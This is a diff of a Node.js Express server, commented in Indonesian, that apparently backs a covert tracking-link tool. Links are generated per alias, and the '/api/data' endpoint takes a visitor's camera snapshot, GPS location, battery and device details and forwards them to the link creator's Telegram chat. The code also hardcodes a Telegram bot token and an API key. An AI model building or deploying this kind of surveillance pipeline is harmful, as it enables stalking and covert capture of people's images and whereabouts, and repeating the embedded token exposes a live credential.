@@ -1,24 +1,18 @@
-// server.js (Versi Final dengan Notifikasi Super Lengkap)
-
-// 1. IMPORT SEMUA PACKAGE YANG DIBUTUHKAN
 const express = require('express');
 const axios = require('axios');
-const FormData = require('form-data'); // <-- Package baru untuk kirim file
+const FormData = require('form-data');
 const { v4: uuidv4 } = require('uuid');
 const cors = require('cors');
 const path = require('path');
 
-// 2. INISIALISASI APLIKASI DAN KONFIGURASI
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Ambil variabel dari environment atau gunakan nilai hardcode (JANGAN UPLOAD KE GITHUB PUBLIK)
 const API_KEY = process.env.API_KEY || "KucingTerbangWarnaWarni123!";
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc"; // Ganti dengan Token Anda
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "6598957548:AAFd8OLzgH-ageyLfDGDxrEhoIS5CuHJ_sc"; 
 
 const tracking_data = {};
 
-// 3. MIDDLEWARE
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
@@ -32,7 +26,6 @@ const apiKeyAuth = (req, res, next) => {
     }
 };
 
-// 4. FUNGSI NOTIFIKASI YANG DISEMPURNAKAN
 async function sendTelegramNotification(chatId, alias, data) {
     const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
     console.log(`[INFO] Memulai pengiriman notifikasi lengkap untuk ${alias}...`);
@@ -43,13 +36,12 @@ async function sendTelegramNotification(chatId, alias, data) {
                            `*🔋 Baterai:*\nLevel: ${data.deviceInfo?.battery?.level || 'N/A'}\nMengisi Daya: ${data.deviceInfo?.battery?.isCharging ? 'Ya' : 'Tidak'}\n\n` +
                            `*💻 Perangkat:*\n${data.deviceInfo?.userAgent || 'N/A'}`;
 
-        // Skenario 1: Jika ada foto, kirim foto dengan semua info teks sebagai caption.
         if (data.photoBase64) {
             const photoBuffer = Buffer.from(data.photoBase64.replace(/^data:image\/jpeg;base64,/, ""), 'base64');
             const formData = new FormData();
             
             formData.append('chat_id', chatId);
-            formData.append('photo', photoBuffer, 'snapshot.jpg'); // Nama file penting
+            formData.append('photo', photoBuffer, 'snapshot.jpg');
             formData.append('caption', `🔔 *Update Baru untuk ${alias}!*\n\n${detailText}`);
             formData.append('parse_mode', 'Markdown');
             
@@ -58,7 +50,6 @@ async function sendTelegramNotification(chatId, alias, data) {
             });
             console.log(`[SUCCESS] Notifikasi foto & teks untuk ${alias} terkirim.`);
 
-        // Skenario 2: Jika tidak ada foto, kirim info teks sebagai pesan biasa.
         } else {
             const messageText = `🔔 *Update Baru untuk ${alias}!*\n\n${detailText}`;
             await axios.post(`${telegramApiUrl}/sendMessage`, {
@@ -69,7 +60,6 @@ async function sendTelegramNotification(chatId, alias, data) {
             console.log(`[SUCCESS] Notifikasi teks (tanpa foto) untuk ${alias} terkirim.`);
         }
 
-        // Selalu kirim lokasi sebagai pesan terpisah jika ada.
         if (data.location) {
             await axios.post(`${telegramApiUrl}/sendLocation`, {
                 chat_id: chatId,
@@ -85,10 +75,6 @@ async function sendTelegramNotification(chatId, alias, data) {
 }
 
 
-// 5. ROUTES / ENDPOINTS APLIKASI
-// (Tidak ada perubahan di sini, sama seperti sebelumnya)
-
-// Endpoint untuk frontend (menerima data dari browser)
 app.post('/api/data', (req, res) => {
     const { link_id, data } = req.body;
     if (!link_id || !data) return res.status(400).json({ status: "error", message: "Data tidak lengkap" });
@@ -117,7 +103,6 @@ app.post('/api/data', (req, res) => {
     }
 });
 
-// Endpoint untuk Bot Telegram (semua diproteksi oleh apiKeyAuth)
 app.post('/api/create_link', apiKeyAuth, (req, res) => {
     const { user_id, alias } = req.body;
     if (!user_id || !alias) {
